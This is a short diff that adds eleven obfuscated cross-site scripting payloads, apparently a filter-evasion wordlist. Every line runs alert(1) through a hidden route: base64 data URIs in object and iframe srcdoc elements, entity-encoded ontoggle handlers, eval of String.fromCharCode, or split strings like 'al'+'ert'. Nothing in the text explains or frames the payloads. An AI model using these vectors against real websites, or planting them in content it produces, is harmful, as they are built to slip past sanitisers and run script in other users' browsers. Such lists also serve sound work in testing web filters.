@@ -1,0 +1,11 @@
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4='></object>"></iframe>
+<object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>
+<details open ontoggle="&#97;&#108;&#101;&#114;&#116;(1)"></details>
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4='></object>"></iframe>
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4="></object>
+<details open ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></details>
+<iframe srcdoc="<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>"></iframe>
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9J3dpbmRvdy5hbGVydCgxKSc+"></object>
+<details open ontoggle="setTimeout('al'+'ert(1)',0)"></details>
+<iframe srcdoc="<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9IndpbmRvdy5hbGVydCgxKSI+PC9zdmc+'></object>"></iframe>
+<details open ontoggle="window['al'+'ert'](1)"></details>
